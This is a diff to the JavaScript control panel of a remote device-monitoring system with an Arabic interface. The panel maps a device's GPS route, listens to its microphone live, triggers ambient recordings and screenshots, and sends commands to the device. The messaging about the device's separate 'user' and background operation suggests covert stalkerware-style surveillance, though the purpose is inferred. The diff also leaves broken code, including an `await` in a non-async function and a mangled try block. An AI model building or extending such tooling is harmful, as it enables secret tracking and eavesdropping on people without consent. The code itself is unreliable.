@@ -25,7 +25,28 @@ let reportFilter     = 'all';
 let mapInstance      = null;
 let heatLayer        = null;
 let routeLayer       = null;
+let routeMarkers     = [];
 let heatmapVisible   = false;
+let mapStyleIndex    = 0;
+let allLocations     = [];
+
+const MAP_STYLES = [
+    {
+        name: '🌍 خريطة الشوارع',
+        url: 'https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',
+        attr: '© OpenStreetMap, © CARTO'
+    },
+    {
+        name: '🛰️ صور الأقمار',
+        url: 'https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}',
+        attr: '© Esri, Maxar, Earthstar Geographics'
+    },
+    {
+        name: '🗺️ هجين (شوارع+صور)',
+        url: 'https://server.arcgisonline.com/ArcGIS/rest/services/World_Street_Map/MapServer/tile/{z}/{y}/{x}',
+        attr: '© Esri, HERE, Garmin'
+    }
+];
 let usageChartInst   = null;
 let autoRefreshTimer = null;
 let logsRealtimeSub  = null;
@@ -36,12 +57,22 @@ let micStreamChannel = null;
 let liveMicAudioCtx  = null;
 let liveMicNextTime  = 0;
 let isLiveMicActive  = false;
+let liveMicAnalyser  = null;
+let liveMicDataArray = null;
+let visualizerReqId  = null;
 const MIC_SAMPLE_RATE = 16_000;
 
+
 // ═══════════════════════════════════════════════════════════
-//  INIT
+//  INIT & GLOBAL PROTECTION
 // ═══════════════════════════════════════════════════════════
+window.onunhandledrejection = (e) => {
+    console.warn('[Global] Suppressing unhandled rejection:', e.reason);
+    e.preventDefault();
+};
+
 document.addEventListener('DOMContentLoaded', () => {
+
     loadDeviceList();
     startAutoRefresh();
     buildSettingsToggles();
@@ -194,12 +225,14 @@ function subscribeToRealtimeUpdates(deviceId) {
     // Clean up any previous subscription for old device
     const prev = realtimeChannels[deviceId];
     if (prev) {
-        db.removeChannel(prev);
+        try { db.removeChannel(prev); } catch (e) {}
         delete realtimeChannels[deviceId];
     }
 
-    const channel = db
-        .channel(`device-updates-${deviceId}`)
+    try {
+        const channel = db
+            .channel(`device-updates-${deviceId}`)
+
 
         // ── New screenshot/log entry → refresh Reports feed ──────────────
         .on('postgres_changes', {
@@ -261,13 +294,21 @@ function subscribeToRealtimeUpdates(deviceId) {
             showNotif(`📍 موقع جديد: ${loc.latitude?.toFixed(4)}, ${loc.longitude?.toFixed(4)}`, 'info');
         })
 
-        .subscribe((status) => {
+        .subscribe((status, err) => {
             console.log(`[Realtime] Channel ${deviceId} status:`, status);
+            if (status === 'CHANNEL_ERROR') {
+                console.error(`[Realtime] Error for ${deviceId}:`, err);
+                showNotif('⚠️ خطأ في الاتصال بالوقت الفعلي', 'warn');
+            }
         });
 
-    realtimeChannels[deviceId] = channel;
-    console.log(`[Realtime] Subscribed to device: ${deviceId}`);
+
+            console.log(`[Realtime] Subscribed to device: ${deviceId}`);
+        } catch (e) {
+            console.error('[Realtime] Subscription setup failed:', e);
+        }
 }
+
 
 // ═══════════════════════════════════════════════════════════
 //  AUTO REFRESH
@@ -485,19 +526,28 @@ function closeLightbox() {
 }
 
 // ═══════════════════════════════════════════════════════════
-//  MAP — LIVE TRACK
+//  MAP — LIVE TRACK (Enhanced v6)
 // ═══════════════════════════════════════════════════════════
+let _baseTileLayer = null;
+
 function initMap() {
     if (mapInstance) return;
     setTimeout(() => {
-        mapInstance = L.map('map', { zoomControl: false }).setView([24.7, 46.7], 6);
+        mapInstance = L.map('map', {
+            zoomControl: false,
+            attributionControl: true
+        }).setView([32.0, -6.5], 6);
+
         L.control.zoom({ position: 'topleft' }).addTo(mapInstance);
 
-        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-            attribution: '© OpenStreetMap, © CARTO',
+        // Default tile layer (dark streets)
+        const style = MAP_STYLES[mapStyleIndex];
+        _baseTileLayer = L.tileLayer(style.url, {
+            attribution: style.attr,
             maxZoom: 19
         }).addTo(mapInstance);
 
+        // Coords display on mouse move
         mapInstance.on('mousemove', e => {
             const d = document.getElementById('coords-display');
             d.classList.remove('hidden');
@@ -508,45 +558,214 @@ function initMap() {
     }, 100);
 }
 
+function switchMapStyle() {
+    if (!mapInstance) return;
+    mapStyleIndex = (mapStyleIndex + 1) % MAP_STYLES.length;
+    const style = MAP_STYLES[mapStyleIndex];
+    if (_baseTileLayer) mapInstance.removeLayer(_baseTileLayer);
+    _baseTileLayer = L.tileLayer(style.url, {
+        attribution: style.attr,
+        maxZoom: 19
+    }).addTo(mapInstance);
+    // Move base layer to bottom
+    _baseTileLayer.bringToBack();
+    // Update button text
+    const btn = document.getElementById('map-style-btn');
+    if (btn) btn.innerText = MAP_STYLES[(mapStyleIndex + 1) % MAP_STYLES.length].name;
+}
+
+// Haversine distance in km between two [lat,lng] points
+function haversineKm(a, b) {
+    const R = 6371;
+    const dLat = (b[0] - a[0]) * Math.PI / 180;
+    const dLon = (b[1] - a[1]) * Math.PI / 180;
+    const s = Math.sin(dLat/2)**2 +
+              Math.cos(a[0]*Math.PI/180) * Math.cos(b[0]*Math.PI/180) *
+              Math.sin(dLon/2)**2;
+    return R * 2 * Math.atan2(Math.sqrt(s), Math.sqrt(1-s));
+}
+
+// Interpolate hex colors for gradient route
+function lerpColor(a, b, t) {
+    const ah = parseInt(a.slice(1), 16);
+    const bh = parseInt(b.slice(1), 16);
+    const ar = (ah >> 16) & 0xff, ag = (ah >> 8) & 0xff, ab = ah & 0xff;
+    const br = (bh >> 16) & 0xff, bg = (bh >> 8) & 0xff, bb = bh & 0xff;
+    const rr = Math.round(ar + (br - ar) * t);
+    const rg = Math.round(ag + (bg - ag) * t);
+    const rb = Math.round(ab + (bb - ab) * t);
+    return `#${((1<<24)|(rr<<16)|(rg<<8)|rb).toString(16).slice(1)}`;
+}
+
+function clearMapLayers() {
+    if (routeLayer) { mapInstance.removeLayer(routeLayer); routeLayer = null; }
+    routeMarkers.forEach(m => mapInstance.removeLayer(m));
+    routeMarkers = [];
+    if (heatLayer) { mapInstance.removeLayer(heatLayer); heatLayer = null; }
+}
+
 async function fetchPositions() {
     if (!currentDeviceId || !mapInstance) return;
+
+    // Show loading indicator on button
+    const refreshBtn = document.getElementById('refresh-route-btn');
+    if (refreshBtn) { refreshBtn.innerText = '⏳ جاري...'; refreshBtn.disabled = true; }
+
     try {
         const { data: locs } = await db.from('locations')
-            .select('latitude, longitude, accuracy, timestamp')
+            .select('latitude, longitude, accuracy, timestamp, battery_level')
             .eq('device_id', currentDeviceId)
             .order('timestamp', { ascending: false })
-            .limit(100);
+            .limit(200);
 
-        if (!locs || locs.length === 0) return;
+        if (refreshBtn) { refreshBtn.innerText = '🔄 تحديث المسار'; refreshBtn.disabled = false; }
+        if (!locs || locs.length === 0) { return; }
 
-        // Remove old layers
-        if (routeLayer) mapInstance.removeLayer(routeLayer);
+        allLocations = locs;
+        clearMapLayers();
 
-        const points = locs.map(l => [l.latitude, l.longitude]);
+        // Points in chronological order (oldest → newest)
+        const chronological = [...locs].reverse();
+        const pts = chronological.map(l => [l.latitude, l.longitude]);
+        const n = pts.length;
 
-        // Draw polyline (route)
-        routeLayer = L.polyline(points, {
-            color: '#3b82f6', weight: 2, opacity: 0.7,
-            dashArray: '4 4'
-        }).addTo(mapInstance);
+        // --- Draw gradient route: one segment per pair of points ---
+        const COLOR_OLD   = '#3b82f6'; // blue (oldest)
+        const COLOR_NEW   = '#22c55e'; // green (newest)
+        for (let i = 0; i < n - 1; i++) {
+            const t   = n > 1 ? i / (n - 1) : 1;
+            const col = lerpColor(COLOR_OLD, COLOR_NEW, t);
+            const seg = L.polyline([pts[i], pts[i+1]], {
+                color: col, weight: 4, opacity: 0.85,
+                lineJoin: 'round', lineCap: 'round'
+            }).addTo(mapInstance);
+            routeMarkers.push(seg);
+        }
 
-        // Latest marker
-        const latest = locs[0];
-        L.circleMarker([latest.latitude, latest.longitude], {
-            radius: 10, fillColor: '#3b82f6',
-            color: '#fff', weight: 2, opacity: 1, fillOpacity: 0.9
-        }).addTo(mapInstance).bindPopup(
-            `<b>آخر موقع</b><br>${formatRelativeTime(latest.timestamp)}<br>
-             دقة: ${latest.accuracy ? latest.accuracy + ' م' : 'غير محدد'}`
-        ).openPopup();
+        // --- Directional arrows along the route ---
+        if (n > 1 && L.polylineDecorator) {
+            const fullLine = L.polyline(pts, { opacity: 0 }).addTo(mapInstance);
+            routeMarkers.push(fullLine);
+            const arrows = L.polylineDecorator(fullLine, {
+                patterns: [{
+                    offset: '10%', repeat: '15%',
+                    symbol: L.Symbol.arrowHead({
+                        pixelSize: 10,
+                        headAngle: 40,
+                        fill: true,
+                        polygon: false,
+                        pathOptions: { color: '#fff', weight: 2, opacity: 0.6 }
+                    })
+                }]
+            }).addTo(mapInstance);
+            routeMarkers.push(arrows);
+        }
 
-        // Zoom to latest
-        mapInstance.flyTo([latest.latitude, latest.longitude], 15, { duration: 1.5 });
+        // --- Intermediate waypoint dots (every 5th point) ---
+        for (let i = 1; i < n - 1; i += Math.max(1, Math.floor(n / 15))) {
+            const loc = chronological[i];
+            const t   = i / (n - 1);
+            const col = lerpColor(COLOR_OLD, COLOR_NEW, t);
+            const nextLoc = chronological[Math.min(i + 1, n-1)];
+            const dist = haversineKm(pts[i], [nextLoc.latitude, nextLoc.longitude]);
+            const dtSec = (new Date(nextLoc.timestamp) - new Date(loc.timestamp)) / 1000;
+            const speedKmh = dtSec > 0 ? (dist / dtSec * 3600).toFixed(1) : '?';
 
-        // Update heatmap if active
+            const dot = L.circleMarker([loc.latitude, loc.longitude], {
+                radius: 5, fillColor: col,
+                color: '#1a1a2e', weight: 1.5,
+                opacity: 1, fillOpacity: 0.9
+            }).bindTooltip(
+                `<div style="font-family:sans-serif;font-size:12px;direction:rtl;">
+                    <b>${formatRelativeTime(loc.timestamp)}</b><br>
+                    📍 ${loc.latitude.toFixed(5)}, ${loc.longitude.toFixed(5)}<br>
+                    🎯 دقة: ${loc.accuracy ? loc.accuracy + ' م' : '?'}<br>
+                    ⚡ ${loc.battery_level != null ? loc.battery_level + '%' : '?'} بطارية<br>
+                    🚀 السرعة: ~${speedKmh} كم/س
+                </div>`,
+                { sticky: true, direction: 'top', className: 'map-tooltip' }
+            ).addTo(mapInstance);
+            routeMarkers.push(dot);
+        }
+
+        // --- START marker (oldest point) ---
+        if (n > 1) {
+            const startPt = pts[0];
+            const startLoc = chronological[0];
+            const startIcon = L.divIcon({
+                html: `<div style="width:26px;height:26px;background:#3b82f6;border:3px solid #fff;border-radius:50% 50% 50% 0;transform:rotate(-45deg);box-shadow:0 2px 8px rgba(0,0,0,0.5);"></div>`,
+                iconSize: [26, 26], iconAnchor: [13, 26]
+            });
+            const sm = L.marker(startPt, { icon: startIcon })
+                .bindPopup(`<div style="direction:rtl;min-width:160px">
+                    <b style="color:#3b82f6">📍 نقطة البداية</b><br>
+                    ${new Date(startLoc.timestamp).toLocaleString('ar-MA')}<br>
+                    🎯 دقة: ${startLoc.accuracy || '?'} م
+                </div>`)
+                .addTo(mapInstance);
+            routeMarkers.push(sm);
+        }
+
+        // --- END / CURRENT marker (newest point) ---
+        const latest = locs[0]; // locs is descending → index 0 is newest
+        const pulseHtml = `
+            <div style="position:relative;width:36px;height:36px;">
+                <div style="position:absolute;inset:0;background:rgba(34,197,94,0.3);border-radius:50%;animation:ping 1.4s cubic-bezier(0,0,.2,1) infinite;"></div>
+                <div style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:18px;height:18px;background:#22c55e;border:3px solid #fff;border-radius:50%;box-shadow:0 2px 10px rgba(34,197,94,0.7);"></div>
+            </div>`;
+        const liveIcon = L.divIcon({ html: pulseHtml, iconSize: [36, 36], iconAnchor: [18, 18], className: '' });
+        const lm = L.marker([latest.latitude, latest.longitude], { icon: liveIcon, zIndexOffset: 1000 })
+            .bindPopup(`<div style="direction:rtl;min-width:190px">
+                <b style="color:#22c55e">✅ الموقع الحالي</b><br>
+                <span style="font-size:11px;color:#888">${new Date(latest.timestamp).toLocaleString('ar-MA')}</span><br>
+                📍 ${latest.latitude.toFixed(6)}, ${latest.longitude.toFixed(6)}<br>
+                🎯 دقة: ${latest.accuracy ? latest.accuracy + ' م' : 'غير محدد'}<br>
+                ⚡ ${latest.battery_level != null ? latest.battery_level + '%' : '?'} بطارية
+            </div>`)
+            .openPopup()
+            .addTo(mapInstance);
+        routeMarkers.push(lm);
+
+        // --- Fly to latest with nice zoom ---
+        mapInstance.flyTo([latest.latitude, latest.longitude], 16, { duration: 1.8, easeLinearity: 0.25 });
+
+        // --- Update stats bar ---
+        updateMapStats(locs, chronological);
+
+        // --- Heatmap update if active ---
         if (heatmapVisible) updateHeatmap(locs);
 
-    } catch (e) { console.error('fetchPositions:', e); }
+    } catch (e) {
+        console.error('fetchPositions:', e);
+        if (refreshBtn) { refreshBtn.innerText = '🔄 تحديث المسار'; refreshBtn.disabled = false; }
+    }
+}
+
+function updateMapStats(locs, chronological) {
+    const statsEl = document.getElementById('map-stats');
+    if (!statsEl) return;
+
+    const n = chronological.length;
+    let totalKm = 0;
+    for (let i = 0; i < n - 1; i++) {
+        totalKm += haversineKm(
+            [chronological[i].latitude, chronological[i].longitude],
+            [chronological[i+1].latitude, chronological[i+1].longitude]
+        );
+    }
+
+    const latest    = locs[0];
+    const oldest    = locs[locs.length - 1];
+    const spanHours = ((new Date(latest.timestamp) - new Date(oldest.timestamp)) / 3600000).toFixed(1);
+    const avgSpeed  = spanHours > 0 ? (totalKm / spanHours).toFixed(1) : '?';
+
+    statsEl.innerHTML = `
+        <span>🗓️ <b>${n}</b> نقطة</span>
+        <span>📏 <b>${totalKm.toFixed(2)} كم</b></span>
+        <span>⏱️ <b>${spanHours}س</b></span>
+        <span>🚀 <b>~${avgSpeed} كم/س</b> متوسط</span>
+    `;
+    statsEl.classList.remove('hidden');
 }
 
 function toggleHeatmap() {
@@ -564,17 +783,18 @@ function toggleHeatmap() {
         btn.innerText = '🌡️ إخفاء Heatmap';
         btn.classList.remove('btn-primary');
         btn.classList.add('btn-amber');
-        fetchPositions();
+        if (allLocations.length > 0) updateHeatmap(allLocations);
+        else fetchPositions();
     }
 }
 
 function updateHeatmap(locs) {
     if (!mapInstance) return;
     if (heatLayer) mapInstance.removeLayer(heatLayer);
-    const points = locs.map(l => [l.latitude, l.longitude, 0.5]);
+    const points = locs.map(l => [l.latitude, l.longitude, 0.6]);
     heatLayer = L.heatLayer(points, {
-        radius: 25, blur: 20, maxZoom: 17,
-        gradient: { 0.2: '#3b82f6', 0.5: '#f59e0b', 0.8: '#ef4444' }
+        radius: 28, blur: 22, maxZoom: 18,
+        gradient: { 0.2: '#1d4ed8', 0.45: '#7c3aed', 0.7: '#f59e0b', 0.9: '#ef4444' }
     }).addTo(mapInstance);
 }
 
@@ -696,6 +916,15 @@ async function startLiveMic() {
     try {
         const AudioCtx = window.AudioContext || /** @type {any} */ (window).webkitAudioContext;
         liveMicAudioCtx = new AudioCtx({ sampleRate: MIC_SAMPLE_RATE });
+
+        // Setup Analyser
+        liveMicAnalyser = liveMicAudioCtx.createAnalyser();
+        liveMicAnalyser.fftSize = 64; // Small size for responsive bars
+        const bufferLength = liveMicAnalyser.frequencyBinCount;
+        liveMicDataArray = new Uint8Array(bufferLength);
+        
+        // Connect to destination
+        liveMicAnalyser.connect(liveMicAudioCtx.destination);
     } catch (e) {
         showNotif('❌ Web Audio API غير مدعوم في هذا المتصفح', 'error');
         return;
@@ -703,6 +932,8 @@ async function startLiveMic() {
 
     liveMicNextTime = liveMicAudioCtx.currentTime + 0.1; // 100 ms initial buffer
     isLiveMicActive = true;
+    _updateVisualizer(); // Start the loop
+
 
     // Subscribe to Supabase Realtime broadcast channel
     micStreamChannel = db.channel(`mic-stream-${currentDeviceId}`)
@@ -712,21 +943,58 @@ async function startLiveMic() {
         })
         .subscribe();
 
+    // Check device online status before sending
+    // Improved: Check both remote_settings (heartbeat) and locations (GPS)
+    let lastSeen = 0;
+    
+    const [settingsRes, locationRes] = await Promise.all([
+        db.from('remote_settings').select('updated_at').eq('device_id', currentDeviceId).maybeSingle(),
+        db.from('locations').select('timestamp').eq('device_id', currentDeviceId)
+            .order('timestamp', { ascending: false }).limit(1).maybeSingle()
+    ]);
+
+    const times = [];
+    if (settingsRes.data?.updated_at) times.push(new Date(settingsRes.data.updated_at).getTime());
+    if (locationRes.data?.timestamp) times.push(new Date(locationRes.data.timestamp).getTime());
+    
+    lastSeen = times.length > 0 ? Math.max(...times) : 0;
+    const offline = lastSeen === 0 || (Date.now() - lastSeen) > 5 * 60 * 1000;
+    
+    if (offline) {
+        const warn = document.getElementById('mic-offline-warning');
+        if (warn) {
+            warn.classList.remove('hidden');
+            const timeStr = lastSeen > 0 ? formatRelativeTime(new Date(lastSeen).toISOString()) : 'أبداً';
+            warn.innerHTML = `⚠️ الجهاز يظهر أنه غير متصل (آخر ظهور: ${timeStr}). قد يتأخر بدء البث حتى يفتح المستخدم التطبيق.`;
+        }
+    }
+
+
     // Send command to start streaming on device
     await sendCommand('MIC_STREAM');
+
 
     // Update UI
     const btn = document.getElementById('live-mic-btn');
     if (btn) {
-        btn.innerText = '⏹ إيقاف البث';
-        btn.classList.add('bg-red-600/40', 'text-red-200', 'border-red-500/60', 'animate-pulse');
-        btn.classList.remove('bg-red-600/20', 'text-red-400', 'border-red-600/40');
+        btn.innerText = '⌛ جاري الاتصال...'; // Change to waiting state
+        btn.classList.add('bg-amber-600/40', 'text-amber-200', 'animate-pulse');
+        btn.classList.remove('bg-red-600/20', 'text-red-400');
     }
     const bar = document.getElementById('live-mic-bar');
     if (bar) bar.classList.remove('hidden');
 
-    showNotif('🎙️ بث مباشر نشط — يتم الاستماع للجهاز الآن', 'info');
+    // Safety timeout: if no chunks in 15s, something is wrong
+    setTimeout(() => {
+        if (isLiveMicActive && btn && btn.innerText.includes('جاري الاتصال')) {
+            showNotif('⚠️ لم يتم استلام بيانات من الجهاز. تأكد من أن التطبيق يعمل في الخلفية.', 'warn');
+            stopLiveMic();
+        }
+    }, 15000);
+
+    showNotif('🎙️ تم إرسال طلب البث — بانتظار استجابة الجهاز', 'info');
 }
+
 
 async function stopLiveMic() {
     isLiveMicActive = false;
@@ -745,6 +1013,16 @@ async function stopLiveMic() {
         liveMicAudioCtx.close().catch(() => {});
         liveMicAudioCtx = null;
     }
+    
+    // Stop visualizer
+    if (visualizerReqId) {
+        cancelAnimationFrame(visualizerReqId);
+        visualizerReqId = null;
+    }
+    // Reset bars
+    const bars = document.querySelectorAll('.vis-bar');
+    bars.forEach(b => b.style.height = '3px');
+
 
     // Restore button
     const btn = document.getElementById('live-mic-btn');
@@ -766,9 +1044,30 @@ async function stopLiveMic() {
  */
 function _playPCMChunk(base64Data) {
     if (!liveMicAudioCtx || !isLiveMicActive) return;
+
+    // First chunk received! Update UI to "Connected"
+    const btn = document.getElementById('live-mic-btn');
+    if (btn && btn.innerText.includes('جاري الاتصال')) {
+        btn.innerText = '⏹ إيقاف البث الحي';
+        btn.classList.remove('bg-amber-600/40', 'text-amber-200');
+        btn.classList.add('bg-red-600/40', 'text-red-200', 'border-red-500/60');
+        showNotif('🎙️ تم الاتصال بنجاح — جاري الاستماع', 'success');
+        
+        // Hide offline warning if visible
+        const warn = document.getElementById('mic-offline-warning');
+        if (warn) warn.classList.add('hidden');
+    }
+
     try {
+        // Force resume AudioContext if browser suspended it
+        if (liveMicAudioCtx.state === 'suspended') {
+            await liveMicAudioCtx.resume();
+        }
+
         // Decode Base64 → Uint8Array
+
         const binary = atob(base64Data);
+
         const bytes  = new Uint8Array(binary.length);
         for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
 
@@ -784,7 +1083,10 @@ function _playPCMChunk(base64Data) {
 
         const source = liveMicAudioCtx.createBufferSource();
         source.buffer = audioBuffer;
-        source.connect(liveMicAudioCtx.destination);
+        
+        // Connect through analyser
+        source.connect(liveMicAnalyser);
+
 
         const now = liveMicAudioCtx.currentTime;
         if (liveMicNextTime < now + 0.02) liveMicNextTime = now + 0.05; // resync if lagging
@@ -795,6 +1097,43 @@ function _playPCMChunk(base64Data) {
         console.warn('[LiveMic] PCM decode error:', e);
     }
 }
+
+/**
+ * Visualizer animation loop.
+ * Updates bar heights based on current frequency data.
+ */
+function _updateVisualizer() {
+    if (!isLiveMicActive || !liveMicAnalyser) return;
+    
+    visualizerReqId = requestAnimationFrame(_updateVisualizer);
+    liveMicAnalyser.getByteFrequencyData(liveMicDataArray);
+    
+    const bars = document.querySelectorAll('.vis-bar');
+    const step = Math.floor(liveMicDataArray.length / bars.length);
+    
+    bars.forEach((bar, i) => {
+        // Logarithmic-like scaling for better sensitivity
+        const raw = liveMicDataArray[i * step] || 0;
+        const val = raw > 0 ? (raw / 255) : 0;
+        
+        // Base pulse height (2px - 4px randomly) to show system is alive
+        const pulse = Math.sin(Date.now() / 200 + i) * 1 + 3;
+        const height = Math.max(pulse, val * 35); // Max height ~35px
+        
+        bar.style.height = `${height}px`;
+        
+        // Dynamic Glow and Color
+        if (raw > 120) {
+            bar.style.background = 'linear-gradient(to top, #3b82f6, #8b5cf6)'; // Purple tint on peak
+            bar.style.filter = 'brightness(1.5) drop-shadow(0 0 8px rgba(99, 102, 241, 0.8))';
+        } else {
+            bar.style.background = 'linear-gradient(to top, #3b82f6, #6366f1)';
+            bar.style.filter = 'none';
+        }
+    });
+}
+
+
 
 /** Send MIC_RECORD command (30 s ambient recording with VAD). */
 async function triggerRecordNow() {
@@ -1072,21 +1411,57 @@ async function fetchSettings() {
 // ═══════════════════════════════════════════════════════════
 //  COMMANDS
 // ═══════════════════════════════════════════════════════════
+async function clearPendingCommands() {
+    if (!currentDeviceId) return showNotif('⚠️ اختر جهازاً أولاً', 'warn');
+    if (!confirm('هل تريد مسح جميع الأوامر المعلقة لهذا الجهاز؟ هذا يساعد في تسريع وصول الأوامر الجديدة.')) return;
+
+    try {
+        const { error } = await db.from('commands')
+            .delete()
+            .eq('device_id', currentDeviceId)
+            .eq('status', 'PENDING');
+
+        if (error) throw error;
+        showNotif('✅ تم مسح طابور الأوامر بنجاح', 'success');
+        
+        // Update the stat counter
+        const { count } = await db.from('commands').select('*', { count: 'exact', head: true }).eq('status', 'PENDING');
+        const st = document.getElementById('stat-pending');
+        if (st) st.innerText = count || 0;
+
+    } catch (e) {
+        showNotif('❌ فشل مسح الأوامر: ' + e.message, 'error');
+    }
+}
+
 async function sendCommand(command, payload = {}) {
+
     if (!currentDeviceId) return showNotif('⚠️ اختر جهازاً أولاً', 'warn');
     try {
-        await db.from('commands').insert({
-            device_id:  currentDeviceId,
-            command:    command,
-            status:     'PENDING',
-            payload:    JSON.stringify(payload),
-            created_at: new Date().toISOString()
+        const { error } = await db.from('commands').insert({
+            device_id: currentDeviceId,
+            command: command,
+            status: 'PENDING',
+            payload: payload // Passed as object, Supabase JS handles JSONB conversion
         });
+        
+        if (error) throw error;
+        
         showNotif(`⚡ أمر ${command} تم إرساله`, 'success');
     } catch (e) {
-        showNotif(`❌ فشل إرسال الأمر`, 'error');
-        console.error(e);
+        let errorMsg = e.message || 'خطأ غير معروف';
+        
+        // Specific hint for the SQL migration issue
+        if (errorMsg.includes('payload') && errorMsg.includes('exist')) {
+            errorMsg = '❌ خطأ: لم يتم تحديث قاعدة البيانات. يرجى تشغيل ملف SQL Migrations في Supabase أولاً.';
+            showNotif(errorMsg, 'error');
+        } else {
+            showNotif(`❌ فشل إرسال الأمر: ${errorMsg}`, 'error');
+        }
+        console.error('[sendCommand] Error:', e);
     }
+
+
 }
 
 async function triggerCapture() { await sendCommand('CAPTURE'); }
